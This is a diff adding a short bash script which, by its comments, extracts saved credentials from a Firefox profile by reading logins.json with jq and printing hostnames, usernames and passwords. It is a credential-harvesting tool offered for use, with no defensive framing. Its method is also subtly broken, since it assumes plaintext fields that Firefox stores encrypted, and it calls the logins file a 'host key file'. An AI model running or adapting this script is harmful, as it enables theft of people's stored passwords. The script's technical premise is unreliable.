@@ -1,0 +1,17 @@
+#!/bin/bash
+
+# This script extracts the credentials from Firefox
+
+# Run this script as the firefox user
+
+# Get the profile directory
+
+profile_dir=$(echo $HOME/.mozilla/firefox/*.default)
+
+# Get the host key file
+
+host_key_file=$profile_dir/logins.json
+
+# Extract the data
+
+jq -r '.logins[] | "\(.hostname),\(.username),\(.password)"' $host_key_file
